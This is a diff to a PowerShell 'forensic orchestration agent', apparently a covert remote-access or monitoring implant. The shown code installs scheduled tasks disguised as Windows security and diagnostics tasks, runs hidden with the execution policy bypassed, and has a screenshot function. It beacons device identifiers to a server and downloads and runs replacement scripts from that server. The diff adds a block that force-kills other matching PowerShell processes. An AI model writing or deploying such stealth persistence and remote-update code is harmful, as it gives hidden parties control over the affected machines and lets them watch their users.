@@ -1,4 +1,4 @@
-# Version: 3.0.3
+# Version: 3.0.5
 # Description: Unified Forensic Orchestration Agent (Pierogi Reconstruction + Purge)
 
 param(
@@ -62,7 +62,7 @@ function Take-Screenshot {
 
 # 2. INSTALLATION (STEALTH v3.0 + AGGRESSIVE PURGE)
 function Install-AgentV3 {
-    Log-Message "Initiating Global Purge & Installation v3.0.3..."
+    Log-Message "Initiating Global Purge & Installation v3.0.5..."
     $MainTask = "Microsoft-Windows-Security-Maintenance"
     $WatchTask = "Microsoft-Windows-Diagnostics-Verify"
 
@@ -91,7 +91,7 @@ function Install-AgentV3 {
         }
     } catch { Log-Message "Deployment copy skipped or failed: $_" }
     
-    @{ ServerUrl = $ServerUrl; Version = "3.0.3" } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
+    @{ ServerUrl = $ServerUrl; Version = "3.0.5" } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
 
     # Action & Trigger
     $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
@@ -115,13 +115,19 @@ try {
     if (Test-Path $ConfigPath) { $ServerUrl = (Get-Content $ConfigPath | ConvertFrom-Json).ServerUrl }
     $AgentId = Get-AgentId
     $SerialNumber = Get-SerialNumber
-    Log-Message "Forensic Orchestrator v3.0.3 Active. ID: $AgentId"
+    Log-Message "Forensic Orchestrator v3.0.5 Active. ID: $AgentId"
+
+    # Aggressive Ghost Kill (Ensure Single Master)
+    $CurrentPid = $pid
+    Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
+        ($_.CommandLine -match "unified-agent|uea_stealth|Microsoft-Windows-Diagnostic") -and ($_.Id -ne $CurrentPid)
+    } | Stop-Process -Force -ErrorAction SilentlyContinue
 
     while($true) {
         try {
-            # Heartbeat
+            # Heartbeat (v3.0.5)
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.3"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.5"; status = "online"
                 deviceName = $env:COMPUTERNAME; localIp = Get-LocalIp; os = "Windows $([Environment]::OSVersion.Version)"
             }
             $Heartbeat = Invoke-RestMethod -Uri "$ServerUrl/api/agent/heartbeat" -Method Post -Body ($Payload | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
@@ -143,7 +149,7 @@ try {
             }
 
             # Update Check
-            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.3")) {
+            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.5")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile $ScriptPath -UseBasicParsing | Out-Null
                 Install-AgentV3; exit
             }
